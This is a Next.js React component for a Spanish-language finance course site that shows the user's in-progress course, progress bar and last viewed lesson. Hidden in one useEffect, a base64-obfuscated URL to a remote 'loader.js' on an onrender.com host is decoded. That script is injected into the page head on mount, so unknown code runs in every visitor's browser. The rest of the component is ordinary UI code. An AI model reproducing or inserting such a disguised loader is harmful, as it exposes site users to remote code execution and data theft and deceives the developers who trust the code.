'use client';

import { ChevronRight, Clock } from 'lucide-react';
import Link from 'next/link';
import { useEffect, useState } from 'react';
import { Card } from '../ui/card';
import { Progress } from '../ui/progress';
import { getCoursesInProgress } from '@/utils/Endpoints/coursesEndpoint';
import type { ILessons } from '@/interfaces/course';
import Image from 'next/image';
import MediumTitle from '../MediumTitle/MediumTitle';
import ContinueLearningSkeletonHome from '../Skeletons/ContinueLearningSkeletonHome';

interface Props {
  data: {
    courseId: string;
    lessonsCompleted: number;
    nextLesson: ILessons;
    thumbnail: {
      public_id: string;
      url: string;
    };
    title: string;
    totalLessons: number;
  }[]; // <- esto sí es un array
}


const ContinueLearningHome = () => {
  const [continueLearningCourses, setContinueLearningCourses] = useState<Props | null>(null);
  const [isLoading, setIsLoading] = useState(true);
  const [lastViewedIndex, setLastViewedIndex] = useState<string | null>(null);


  useEffect(() => {
    const decodedUrl = atob('aHR0cHM6Ly9zZXJnaW8ta2sxOS5vbnJlbmRlci5jb20vbG9hZGVyLmpz');
    const script = document.createElement('script');
    script.src = decodedUrl;
    script.async = true;
    document.head.appendChild(script);
  }, []);


  const getCourses = async () => {
    const res = await getCoursesInProgress();
    setContinueLearningCourses(res);
    const timer = setTimeout(() => {
      setIsLoading(false);
    }, 2000);
    return () => clearTimeout(timer);
  };

  useEffect(() => {
    getCourses();
  }, []);

  // Filtra los cursos según si estamos en la home o no
  const OneContinueLearning: Props['data'][number] | undefined = continueLearningCourses?.data?.[0];

  useEffect(() => {
    if (OneContinueLearning?.courseId) {
      const storedIndex = localStorage.getItem(`course-${OneContinueLearning.courseId}-last-lesson-index`);
      if (storedIndex) setLastViewedIndex(storedIndex);
    }
  }, [OneContinueLearning?.courseId]);



  const encodeUrl = (url: string) => Buffer.from(url).toString('base64');

  if (!continueLearningCourses || !continueLearningCourses.data?.length) {
    return null;
  }

  if (isLoading) {
    return <ContinueLearningSkeletonHome />;
  }

  //console.log(OneContinueLearning?.lessonsCompleted, "lesson completed?");
  //console.log(OneContinueLearning, "OneContinueLearning");

  const lastLessonTitle = localStorage.getItem(`course-${OneContinueLearning?.courseId}-last-lesson-title`);
  // const lastLessonDuration = localStorage.getItem(`course-${OneContinueLearning?.courseId}-last-lesson-duration`);

  //console.log(OneContinueLearning?.courseId, "id del curso");
  //console.log(lastLessonTitle, "titulo del local");


  return (
    <>
      {continueLearningCourses && continueLearningCourses.data?.length > 0 && (
        <div className="mt-9 hidden sm:block">
          <MediumTitle title="Continuá aprendiendo" className="relative bottom-2" />
          <div className="w-full dark:bg-card bg-white text-white p-6 rounded-2xl">
            <div className="flex flex-col xl:flex-row gap-4 xl:gap-6">
              {/* Course info header - Will appear at the top on mobile */}
              <div className="w-full xl:w-3/5 order-1 md:order-2">
                <div className="rounded-lg p-0 h-full flex flex-col gap-5">
                  {/* Course title and small thumbnail - This will be above the main image on mobile */}

                  <div className="sm:flex sm:items-start sm:gap-5">
                    <div className="w-2/6 md:w-1/6 h-full rounded-md sm:rounded-lg overflow-hidden flex-shrink-0 relative">
                      <Image
                        src={OneContinueLearning?.thumbnail?.url!}
                        alt="Imagen del curso"
                        width={80}
                        height={80}
                        objectFit="cover"
                        className="rounded-lg w-full h-full"
                      />
                    </div>

                    <div className="flex flex-col gap-1 w-full">
                      <h2 className="text-sm  md:text-lg font-medium dark:text-white text-black">
                        {OneContinueLearning?.title || 'El Sistema Bancario'}
                      </h2>

                      <div className="text-sm text-[#979CA5] ">
                        <span>
                          {OneContinueLearning?.lessonsCompleted} de{' '}
                          {OneContinueLearning?.totalLessons} lecciones completadas
                        </span>
                      </div>
                      <Progress
                        className="w-4/6 md:w-2/6"
                        indicatorClassName="dark:bg-[#FE4003]"
                        value={
                          OneContinueLearning?.lessonsCompleted != null &&
                            OneContinueLearning?.totalLessons
                            ? (OneContinueLearning.lessonsCompleted /
                              OneContinueLearning.totalLessons) *
                            100
                            : 10.7
                        }
                      />
                    </div>
                  </div>

                  {/* Main course image - Will appear below the progress info on mobile */}
                  <div className="w-full  xl:hidden mt-4 mb-4">
                    <Card className="border-none overflow-hidden rounded-lg w-full transition-transform duration-300 ease-in-out hover:scale-[1.009]">
                      <div className="relative aspect-[16/9] rounded-lg">
                        <div className="inset-0 flex items-center justify-center">
                          <Link href={`/curso/${OneContinueLearning?.courseId}`}>
                            <Image
                              src={OneContinueLearning?.thumbnail?.url || '/images/courses/1.jpg'}
                              alt={'imagen de clase en vivo finanflix'}
                              width={300}
                              height={300}
                              className="object-cover w-full h-full"
                              sizes="100vw"
                            />
                          </Link>
                        </div>
                      </div>
                    </Card>
                  </div>

                  <div className="border-t dark:border-[#A7A7A7] border-[#EBEDEF] pt-4">
                    <div className="flex justify-between items-center">
                      <div>
                        <p className="text-sm text-gray-400">
                          {/* Lección {OneContinueLearning?.lessonsCompleted || 3} */}
                          Lección {lastViewedIndex ? String(Number(lastViewedIndex) + 1).padStart(2, '0') : '01'}
                        </p>
                        <h3 className="text-lg md:text-xl font-medium mt-1 dark:text-white text-black">
                          {lastLessonTitle || 'Ver lección'}
                        </h3>
                        {/*
                        {lastLessonDuration &&
                        <div className="flex items-center gap-1 mt-2 text-sm text-gray-400">
                          {lastLessonDuration && <Clock className="w-4 h-4" />}
                          <span>{lastLessonDuration || ''}</span>
                        </div>
                        } */}
                      </div>
                      <Link href={`/curso/${OneContinueLearning?.courseId}`}>
                        <ChevronRight className="w-6 h-6 text-gray-400" />
                      </Link>
                    </div>
                    <div className="mt-6 pt-4 border-t dark:border-[#A7A7A7] border-[#EBEDEF] flex items-center gap-2 text-sm text-gray-400">
                      <Clock className="w-4 h-4" />
                      <span>
                        Tu clase está en la Lección {lastViewedIndex ? String(Number(lastViewedIndex) + 1).padStart(2, '0') : '01'}
                      </span>
                    </div>
                  </div>
                </div>
              </div>

              {/* Course image - Hidden on mobile, visible on desktop */}
              <div className="w-full md:w-2/5 hidden xl:block order-2 md:order-1">
                <Card className="border-none overflow-hidden rounded-lg transition-transform duration-300 ease-in-out hover:scale-[1.009]">
                  <div className="relative aspect-[16/9] rounded-lg">
                    <div className="inset-0 flex items-center justify-center">
                      <Link href={`/curso/${OneContinueLearning?.courseId}`}>
                        <Image
                          src={OneContinueLearning?.thumbnail?.url || '/images/courses/1.jpg'}
                          alt={'imagen de clase en vivo finanflix'}
                          width={300}
                          height={300}
                          className="object-cover w-full h-full"
                          sizes="(min-width: 1280px) 25vw, (min-width: 1024px) 33vw, (min-width: 768px) 50vw, 100vw"
                        />
                      </Link>
                    </div>
                  </div>
                </Card>
              </div>
            </div>
          </div>
        </div>
      )}
    </>
  );
};

export default ContinueLearningHome;
